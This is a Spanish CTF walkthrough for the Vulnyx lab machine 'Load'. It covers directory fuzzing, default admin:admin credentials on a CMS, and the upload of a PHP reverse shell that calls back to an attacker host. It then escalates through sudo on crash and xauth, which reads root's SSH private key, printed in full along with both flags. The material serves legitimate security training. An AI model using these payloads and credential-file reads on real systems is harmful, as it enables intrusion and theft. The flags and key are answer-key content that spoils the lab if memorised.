---
icon: flag
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
  metadata:
    visible: true
---

# Load Vulnyx (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-12 03:21 EDT
Nmap scan report for 192.168.5.76
Host is up (0.0011s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
|_  256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
| http-robots.txt: 1 disallowed entry 
|_/ritedev/
|_http-server-header: Apache/2.4.57 (Debian)
MAC Address: 08:00:27:D5:CE:10 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 114.14 seconds
```

Veremos el puerto `80` bastante interesante en el que aloja una pagina web, pero si entramos dentro del mismo veremos una pagina de `apache` normal y corriente, por lo que vamos a realizar un poco de `fuzzing` a ver que vemos.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.76/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10701]
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/robots.txt           (Status: 200) [Size: 34]
Progress: 143134 / 882244 (16.22%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 143359 / 882244 (16.25%)
===============================================================
Finished
===============================================================
```

Veremos un `robots.txt` vamos a ver que esconde ese archivo...

```
URL = http://<IP>/robots.txt
```

Info:

```
User-agent: *
Disallow: /ritedev/
```

Veremos una ubicacion bastante interesante, vamos a probar a meternos en dicha ruta a ver que encontramos.

```
URL = http://<IP>/ritedev
```

Dentro de dicha pagina veremos que carga correctamente, pero de forma aparente no vemos que esconda nada, vamos a realizar un poco de `fuzzing` tambien en esta pagina a ver que vemos.

## Escalate user www-data

```shell
gobuster dir -u http://<IP>/ritedev -w <WORDLIST> -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.76/ritedev/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/templates            (Status: 403) [Size: 277]
/media                (Status: 403) [Size: 277]
/files                (Status: 200) [Size: 6]
/data                 (Status: 403) [Size: 277]
/admin.php            (Status: 200) [Size: 1098]
/cms                  (Status: 200) [Size: 4]
Progress: 170522 / 882244 (19.33%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 170806 / 882244 (19.36%)
===============================================================
Finished
===============================================================
```

Vemos un archivo muy interesante llamado `admin.php` vamos a ir a dicha ruta a ver que vemos...

```
URL = http://<IP>/ritedev/admin.php
```

Entrando dentro del mismo veremos un `login` el cual vamos a probar algunas credenciales por defecto, probando `admin:admin` veremos que nos funcionara a la primera ya que no dara ningun error, veremos abajo a la izquierda este boton de `Admin`:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-08-12 093129.png" alt=""><figcaption></figcaption></figure>

Si le damos veremos esto:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-08-12 093148.png" alt=""><figcaption></figcaption></figure>

Dentro del mismo y explorando un poco hay una seccion interesante llamada `Files Manager` si entramos dentro y le damos al boton llamado `Upload File` nos metera en una seccion en la que podremos subir un archivo, en este punto se nos ocurre subir un archivo `PHP` con una `reverse shell` de esta forma.

> shell.php

```php
<?php
$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

Teniendo el archivo creado, le daremos a `Browser...` en la seccion de `File` para subir el archivo, pondremos una configuracion basica sin importancia, una vez dandole al boton de `Ok - upload file` veremos que el archivo se nos subio correctamente, ahora nos pondremos a la escucha:

```shell
nc -lvnp <PORT>
```

Cuando subimos el archivo nos lleva a esta parte:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-08-12 094041.png" alt=""><figcaption></figcaption></figure>

Aqui seleccionamos el archivo llamado `shell.php` veremos que nos lleva a una ruta que no es, por lo que le tendremos que poner la palabra `/ritedev` antes de `/media` quedando algo asi:

```
URL = http://<IP>/ritedev/media/shell.php
```

Ahora si volvemos a donde tenemos la escucha, veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.5.50] from (UNKNOWN) [192.168.5.76] 56016
whoami
www-data
```

Vemos que ha funcionado, por lo que vamos a sanitizar la `shell`:

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user travis

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for www-data on load:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User www-data may run the following commands on load:
    (travis) NOPASSWD: /usr/bin/crash
```

Veremos que podremos ejecutar el binario `crash` como el usuario `travis` por lo que haremos lo siguiente:

```shell
sudo -u travis crash -h
!bash
```

Info:

```
travis@load:/var/www$ whoami
travis
```

Con esto veremos que seremos dicho usuario, antes vamos a leer la `flag` del usuario.

> user.txt

```
c08d9e59eb1252c60bf2ec2fd73c87f1
```

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for travis on load:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User travis may run the following commands on load:
    (root) NOPASSWD: /usr/bin/xauth
```

Vemos que podemos ejecutar el binario `xauth` como el usuario `root`, por lo que vamos a leer la ayuda e investigar que escalada puede tener.

Investigando un rato, si leemos bien la ayuda veremos que podemos leer cualquier archivo del sistema ejecutando `source`:

```
source filename                read commands from file
```

Vamos a probar a intentar leer la clave privada de `root` por si tuviera alguna, si no podremos intentar leer el `shadow`.

```shell
sudo /usr/bin/xauth source /root/.ssh/id_rsa
```

Info:

```
/usr/bin/xauth:  file /root/.Xauthority does not exist
/usr/bin/xauth: /root/.ssh/id_rsa:1:  unknown command "-----BEGIN"
/usr/bin/xauth: /root/.ssh/id_rsa:2:  unknown command "MIIEpAIBAAKCAQEAn1xk2mDBXCTen7d97aY7rEVweRUsVE5Zl4sGPG/yXLAAuodz"
/usr/bin/xauth: /root/.ssh/id_rsa:3:  unknown command "xjGuAqvTRhG4omhxiJeDr9taOePsIaUGI3Q/qBqUsbnuM/86vu/ANM6+Olzt80fc"
/usr/bin/xauth: /root/.ssh/id_rsa:4:  unknown command "Cv1QVKIdFOweMAiXskvQEV7Fw3qha7fFbf/D8L7BCgXrT70/p9jf4FBroC9pFsRy"
/usr/bin/xauth: /root/.ssh/id_rsa:5:  unknown command "6i7CFxcAfji+OeGu5ezhL21uwkTk22vmnBL1hAqn7p2vOmzg57UkP1VAN819oBLS"
/usr/bin/xauth: /root/.ssh/id_rsa:6:  unknown command "YUKsCrgjKsdQsFCef9lyFty8Dxpmfwg5t0MmLhA/uhDjvQD9k9cR95+Ru5mV467B"
/usr/bin/xauth: /root/.ssh/id_rsa:7:  unknown command "kGad73SHXTHWh9gy0iunAMMveUiEf/qWw2qo8QIDAQABAoIBAARD2sclc8ddjT/F"
/usr/bin/xauth: /root/.ssh/id_rsa:8:  unknown command "D2++1TYFHb9/25HeDvPJWr9fV6M3aq2TVnvldHzJ0Hu9ma1vEirPs0yPmFiYSweT"
/usr/bin/xauth: /root/.ssh/id_rsa:9:  unknown command "fRiR0epT28rt6PwnRpE5pXFEXz78obmzIKaCpRW+yPx4XU53zGePM+BjIvPaYluZ"
/usr/bin/xauth: /root/.ssh/id_rsa:10:  unknown command "rYUGJV5aHJyCEAwwSnXZjhRY0qiU0Tt8VWtwoaltImiNoc9yA7cbWOJcmv4g+YHy"
/usr/bin/xauth: /root/.ssh/id_rsa:11:  unknown command "2ce4xb7DAZFf0p7kVLEL2jvaYImUCT12rIo01+q1z9pntW9Y+1JqVIqkGMNITFEf"
/usr/bin/xauth: /root/.ssh/id_rsa:12:  unknown command "th3cea9fuhVxiAMIj9xLd8uG6/qUAU8ITjRZwOorJJwqwkaTWdxJq8D6+1UBEGyC"
/usr/bin/xauth: /root/.ssh/id_rsa:13:  unknown command "sRXtk8kCgYEA9f2uC7+mDRDWdr2rCaL5hY3XiqNp+PINgYwWm5ELriZORrXV6PwZ"
/usr/bin/xauth: /root/.ssh/id_rsa:14:  unknown command "AIuK7vwoNk7+MkGtveK2GwEocIZMipdnTyIBeaGUExBBgIE16IxIQaDw/zi93PVD"
/usr/bin/xauth: /root/.ssh/id_rsa:15:  unknown command "BoJ5uK+N5pCVQ67VFNfyDoiZn2EbA8pWXAKJMIJUnRpb4o5306grfiMCgYEApdhZ"
/usr/bin/xauth: /root/.ssh/id_rsa:16:  unknown command "He5k7xrccGbu20FnjeMqpfzDVeN8n06ycz4H8L0UMeC22Dy6r/6tFhJWuVmxZpa+"
/usr/bin/xauth: /root/.ssh/id_rsa:17:  unknown command "sbPEAqc6q+WjXzFe2YZ4Fhcyj/t7QXEenWrSF6gQJvBN2glWNWkIrvTFjcI5wY/7"
/usr/bin/xauth: /root/.ssh/id_rsa:18:  unknown command "ECoDHdzGprLpziq73Ukimk2TmRYur7mYIU0Qy9sCgYEAqnif6eJph7p4dZdhdW8s"
/usr/bin/xauth: /root/.ssh/id_rsa:19:  unknown command "7oHqslgm82+DLpjPfgWZi5leO6B92lUCWp9Zq96xW1mIzXk4l1QKkVJPHRPk7VKZ"
/usr/bin/xauth: /root/.ssh/id_rsa:20:  unknown command "NHzDevAftspYKl7g5gR5eom3GZfP89VAGr3G7tcyRmtCFcKORkCUrb+6fnoEB69s"
/usr/bin/xauth: /root/.ssh/id_rsa:21:  unknown command "A516R1S6oJkIvkuu/M4ZPfMCgYBk4Ca8rP/Z7FW/TOzmkm7hgBa15fwOpxNrdxvW"
/usr/bin/xauth: /root/.ssh/id_rsa:22:  unknown command "OxnrVacN+6hb+Px5BojTjw4PKb5dLz4IqtaD4qIuYryvr0EJQOCUV0HbEFVVZfAA"
/usr/bin/xauth: /root/.ssh/id_rsa:23:  unknown command "QjROTVydwrcn81vrmtq8SIhNhKFK2kAVAejpZhuy08qhK58fp1eT0bIAgNye6F3f"
/usr/bin/xauth: /root/.ssh/id_rsa:24:  unknown command "i5e21wKBgQDDCQhaWuW5A5xF4N7obHX9HWgdfNLEABfub2Ysu9xLXdW5lhKxfVsZ"
/usr/bin/xauth: /root/.ssh/id_rsa:25:  unknown command "JAavd3wkMRXHLIOQtOiV9z3F2PmbO3h6yR6esFl0tGcnfZYmaiZJN/MLZKpL9WI/"
/usr/bin/xauth: /root/.ssh/id_rsa:26:  unknown command "WuTyDRk99zQu4GNenQiUDmxYCuOuX5kggXaakAN98THXncO38BAAiA=="
/usr/bin/xauth: /root/.ssh/id_rsa:27:  unknown command "-----END"
```

Veremos que ha funcionado, ahora con un comando vamos a dejarlo limpio en un archivo viendose de esta forma:

```shell
grep 'unknown command' entrada.txt | cut -d'"' -f2 > id_rsa
```

> entrada.txt

```
/usr/bin/xauth:  file /root/.Xauthority does not exist
/usr/bin/xauth: /root/.ssh/id_rsa:1:  unknown command "-----BEGIN"
/usr/bin/xauth: /root/.ssh/id_rsa:2:  unknown command "MIIEpAIBAAKCAQEAn1xk2mDBXCTen7d97aY7rEVweRUsVE5Zl4sGPG/yXLAAuodz"
/usr/bin/xauth: /root/.ssh/id_rsa:3:  unknown command "xjGuAqvTRhG4omhxiJeDr9taOePsIaUGI3Q/qBqUsbnuM/86vu/ANM6+Olzt80fc"
/usr/bin/xauth: /root/.ssh/id_rsa:4:  unknown command "Cv1QVKIdFOweMAiXskvQEV7Fw3qha7fFbf/D8L7BCgXrT70/p9jf4FBroC9pFsRy"
/usr/bin/xauth: /root/.ssh/id_rsa:5:  unknown command "6i7CFxcAfji+OeGu5ezhL21uwkTk22vmnBL1hAqn7p2vOmzg57UkP1VAN819oBLS"
/usr/bin/xauth: /root/.ssh/id_rsa:6:  unknown command "YUKsCrgjKsdQsFCef9lyFty8Dxpmfwg5t0MmLhA/uhDjvQD9k9cR95+Ru5mV467B"
/usr/bin/xauth: /root/.ssh/id_rsa:7:  unknown command "kGad73SHXTHWh9gy0iunAMMveUiEf/qWw2qo8QIDAQABAoIBAARD2sclc8ddjT/F"
/usr/bin/xauth: /root/.ssh/id_rsa:8:  unknown command "D2++1TYFHb9/25HeDvPJWr9fV6M3aq2TVnvldHzJ0Hu9ma1vEirPs0yPmFiYSweT"
/usr/bin/xauth: /root/.ssh/id_rsa:9:  unknown command "fRiR0epT28rt6PwnRpE5pXFEXz78obmzIKaCpRW+yPx4XU53zGePM+BjIvPaYluZ"
/usr/bin/xauth: /root/.ssh/id_rsa:10:  unknown command "rYUGJV5aHJyCEAwwSnXZjhRY0qiU0Tt8VWtwoaltImiNoc9yA7cbWOJcmv4g+YHy"
/usr/bin/xauth: /root/.ssh/id_rsa:11:  unknown command "2ce4xb7DAZFf0p7kVLEL2jvaYImUCT12rIo01+q1z9pntW9Y+1JqVIqkGMNITFEf"
/usr/bin/xauth: /root/.ssh/id_rsa:12:  unknown command "th3cea9fuhVxiAMIj9xLd8uG6/qUAU8ITjRZwOorJJwqwkaTWdxJq8D6+1UBEGyC"
/usr/bin/xauth: /root/.ssh/id_rsa:13:  unknown command "sRXtk8kCgYEA9f2uC7+mDRDWdr2rCaL5hY3XiqNp+PINgYwWm5ELriZORrXV6PwZ"
/usr/bin/xauth: /root/.ssh/id_rsa:14:  unknown command "AIuK7vwoNk7+MkGtveK2GwEocIZMipdnTyIBeaGUExBBgIE16IxIQaDw/zi93PVD"
/usr/bin/xauth: /root/.ssh/id_rsa:15:  unknown command "BoJ5uK+N5pCVQ67VFNfyDoiZn2EbA8pWXAKJMIJUnRpb4o5306grfiMCgYEApdhZ"
/usr/bin/xauth: /root/.ssh/id_rsa:16:  unknown command "He5k7xrccGbu20FnjeMqpfzDVeN8n06ycz4H8L0UMeC22Dy6r/6tFhJWuVmxZpa+"
/usr/bin/xauth: /root/.ssh/id_rsa:17:  unknown command "sbPEAqc6q+WjXzFe2YZ4Fhcyj/t7QXEenWrSF6gQJvBN2glWNWkIrvTFjcI5wY/7"
/usr/bin/xauth: /root/.ssh/id_rsa:18:  unknown command "ECoDHdzGprLpziq73Ukimk2TmRYur7mYIU0Qy9sCgYEAqnif6eJph7p4dZdhdW8s"
/usr/bin/xauth: /root/.ssh/id_rsa:19:  unknown command "7oHqslgm82+DLpjPfgWZi5leO6B92lUCWp9Zq96xW1mIzXk4l1QKkVJPHRPk7VKZ"
/usr/bin/xauth: /root/.ssh/id_rsa:20:  unknown command "NHzDevAftspYKl7g5gR5eom3GZfP89VAGr3G7tcyRmtCFcKORkCUrb+6fnoEB69s"
/usr/bin/xauth: /root/.ssh/id_rsa:21:  unknown command "A516R1S6oJkIvkuu/M4ZPfMCgYBk4Ca8rP/Z7FW/TOzmkm7hgBa15fwOpxNrdxvW"
/usr/bin/xauth: /root/.ssh/id_rsa:22:  unknown command "OxnrVacN+6hb+Px5BojTjw4PKb5dLz4IqtaD4qIuYryvr0EJQOCUV0HbEFVVZfAA"
/usr/bin/xauth: /root/.ssh/id_rsa:23:  unknown command "QjROTVydwrcn81vrmtq8SIhNhKFK2kAVAejpZhuy08qhK58fp1eT0bIAgNye6F3f"
/usr/bin/xauth: /root/.ssh/id_rsa:24:  unknown command "i5e21wKBgQDDCQhaWuW5A5xF4N7obHX9HWgdfNLEABfub2Ysu9xLXdW5lhKxfVsZ"
/usr/bin/xauth: /root/.ssh/id_rsa:25:  unknown command "JAavd3wkMRXHLIOQtOiV9z3F2PmbO3h6yR6esFl0tGcnfZYmaiZJN/MLZKpL9WI/"
/usr/bin/xauth: /root/.ssh/id_rsa:26:  unknown command "WuTyDRk99zQu4GNenQiUDmxYCuOuX5kggXaakAN98THXncO38BAAiA=="
/usr/bin/xauth: /root/.ssh/id_rsa:27:  unknown command "-----END"
```

> id\_rsa

```
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAn1xk2mDBXCTen7d97aY7rEVweRUsVE5Zl4sGPG/yXLAAuodz
xjGuAqvTRhG4omhxiJeDr9taOePsIaUGI3Q/qBqUsbnuM/86vu/ANM6+Olzt80fc
Cv1QVKIdFOweMAiXskvQEV7Fw3qha7fFbf/D8L7BCgXrT70/p9jf4FBroC9pFsRy
6i7CFxcAfji+OeGu5ezhL21uwkTk22vmnBL1hAqn7p2vOmzg57UkP1VAN819oBLS
YUKsCrgjKsdQsFCef9lyFty8Dxpmfwg5t0MmLhA/uhDjvQD9k9cR95+Ru5mV467B
kGad73SHXTHWh9gy0iunAMMveUiEf/qWw2qo8QIDAQABAoIBAARD2sclc8ddjT/F
D2++1TYFHb9/25HeDvPJWr9fV6M3aq2TVnvldHzJ0Hu9ma1vEirPs0yPmFiYSweT
fRiR0epT28rt6PwnRpE5pXFEXz78obmzIKaCpRW+yPx4XU53zGePM+BjIvPaYluZ
rYUGJV5aHJyCEAwwSnXZjhRY0qiU0Tt8VWtwoaltImiNoc9yA7cbWOJcmv4g+YHy
2ce4xb7DAZFf0p7kVLEL2jvaYImUCT12rIo01+q1z9pntW9Y+1JqVIqkGMNITFEf
th3cea9fuhVxiAMIj9xLd8uG6/qUAU8ITjRZwOorJJwqwkaTWdxJq8D6+1UBEGyC
sRXtk8kCgYEA9f2uC7+mDRDWdr2rCaL5hY3XiqNp+PINgYwWm5ELriZORrXV6PwZ
AIuK7vwoNk7+MkGtveK2GwEocIZMipdnTyIBeaGUExBBgIE16IxIQaDw/zi93PVD
BoJ5uK+N5pCVQ67VFNfyDoiZn2EbA8pWXAKJMIJUnRpb4o5306grfiMCgYEApdhZ
He5k7xrccGbu20FnjeMqpfzDVeN8n06ycz4H8L0UMeC22Dy6r/6tFhJWuVmxZpa+
sbPEAqc6q+WjXzFe2YZ4Fhcyj/t7QXEenWrSF6gQJvBN2glWNWkIrvTFjcI5wY/7
ECoDHdzGprLpziq73Ukimk2TmRYur7mYIU0Qy9sCgYEAqnif6eJph7p4dZdhdW8s
7oHqslgm82+DLpjPfgWZi5leO6B92lUCWp9Zq96xW1mIzXk4l1QKkVJPHRPk7VKZ
NHzDevAftspYKl7g5gR5eom3GZfP89VAGr3G7tcyRmtCFcKORkCUrb+6fnoEB69s
A516R1S6oJkIvkuu/M4ZPfMCgYBk4Ca8rP/Z7FW/TOzmkm7hgBa15fwOpxNrdxvW
OxnrVacN+6hb+Px5BojTjw4PKb5dLz4IqtaD4qIuYryvr0EJQOCUV0HbEFVVZfAA
QjROTVydwrcn81vrmtq8SIhNhKFK2kAVAejpZhuy08qhK58fp1eT0bIAgNye6F3f
i5e21wKBgQDDCQhaWuW5A5xF4N7obHX9HWgdfNLEABfub2Ysu9xLXdW5lhKxfVsZ
JAavd3wkMRXHLIOQtOiV9z3F2PmbO3h6yR6esFl0tGcnfZYmaiZJN/MLZKpL9WI/
WuTyDRk99zQu4GNenQiUDmxYCuOuX5kggXaakAN98THXncO38BAAiA==
-----END RSA PRIVATE KEY-----
```

En dicho archivo le añadiremos las `RSA PRIVATE KEY-----` depues de `END` y `BEGIN` para que quede con el formato correcto.

Desde nuestro `kali` vamos a conectarnos con la clave privada de `root` por `SSH` de esta forma.

```shell
chmod 600 id_rsa
ssh -i id_rsa root@<IP>
```

Info:

```
root@load:~# whoami
root
```

Veremos que ha funcionado, por lo que vamos a leer la `flag` de `root`.

> .roooooooooooooooooooooooooooooooooooot.txt

```
85ed9306438d8302cbb4dcbc7c5491b3
```
